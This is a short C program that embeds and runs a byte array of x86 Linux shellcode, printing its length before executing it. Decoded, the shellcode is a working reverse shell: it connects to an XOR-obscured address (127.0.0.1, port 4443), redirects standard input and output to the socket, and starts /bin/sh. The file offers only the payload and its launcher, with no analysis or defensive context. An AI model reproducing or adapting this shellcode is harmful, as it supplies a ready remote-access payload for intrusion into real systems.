#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x31\xdb\x31\xc9\x99\xb0\x66\x43\x52\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb8\xd5\xaa\xaa\xab\xbb\xaa\xaa\xaa\xaa\x31\xd8\x52\x50\x66\x68\x11\x5b\x66\x6a\x02\x89\xe1\x31\xc0\x31\xdb\xb0\x66\xb3\x03\x6a\x10\x51\x56\x89\xe1\xcd\x80\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x89\xf3\xfe\xc9\xcd\x80\x75\xf4\x31\xc9\x51\x6a\x0b\x58\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";
main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	